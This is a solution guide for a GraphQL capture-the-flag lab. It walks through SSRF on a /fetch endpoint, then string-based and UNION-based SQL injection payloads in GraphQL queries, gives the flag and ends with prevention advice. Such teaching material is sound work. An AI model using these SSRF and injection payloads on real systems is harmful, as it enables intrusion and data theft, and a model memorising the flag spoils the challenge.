# GraphQL SQL Injection CTF Challenge - Solution Guide

## File Structure
```
/graphql-ctf-challenge/
├── app.js                 # Main application file
├── database.db            # SQLite database (created at runtime)
├── Dockerfile             # Docker configuration
├── docker-compose.yml     # Docker Compose configuration
├── .dockerignore          # Docker ignore file
├── package.json           # Node.js package configuration
├── public/                # Static files
│   ├── css/
│   │   └── style.css      # CSS styles
│   ├── index.html         # Home page
│   ├── login.html         # Login page
│   └── dashboard.html     # Dashboard page
└── README.md              # Challenge description and setup instructions
```

## Challenge Steps

### 1. Initial Access
1. Access the website and read the initial page.
2. Notice the login page and the hint to log in as "guest" with password "guest123".
3. Successfully log in as guest and access the dashboard.

### 2. Exploiting SSRF to Gain Admin Access
1. In the dashboard, notice the "Developer Notes" section that mentions a fetch utility: `/fetch?url=http://some-internal-service`.
2. This is a Server-Side Request Forgery (SSRF) vulnerability.
3. Exploit this by requesting: `/fetch?url=http://localhost:4000/graphql`
4. This will change your session to have admin privileges.

### 3. GraphQL Access and SQL Injection
1. Now with admin access, notice the Admin Panel section that appears on the dashboard.
2. Click "Access GraphQL" to access the GraphiQL interface at `/graphql`.
3. Explore the available queries:
   - `getUser(username: String)`
   - `getAllProducts`
   - `getProductById(id: Int)`

4. Identify SQL injection in the `getUser` query by trying:
```graphql
{
  getUser(username: "admin' OR '1'='1") {
    id
    username
    role
  }
}
```

5. Similarly, try SQL injection on `getProductById`:
```graphql
{
  getProductById(id: "-1 UNION SELECT 3, secret_info, 'description', 0 FROM product_secrets WHERE product_id = 3") {
    id
    name
    description
    price
  }
}

```

6. Discover the flag in the `secret_info` field of the "Security Device" product:
``` 
Spark{s0_M4ny_w4yss_t0_w1N!!!}
```

## Key Vulnerabilities
1. SSRF vulnerability in the `/fetch` endpoint
2. Improper access control to the GraphQL endpoint
3. SQL injection in GraphQL queries:
   - String-based in `getUser`
   - Integer-based in `getProductById`

## Prevention Techniques
1. Validate and sanitize all user inputs
2. Use prepared statements or parameterized queries
3. Implement proper access controls
4. Disable introspection in production GraphQL servers
5. Validate URLs in fetch operations
6. Implement network-level controls to prevent internal network access
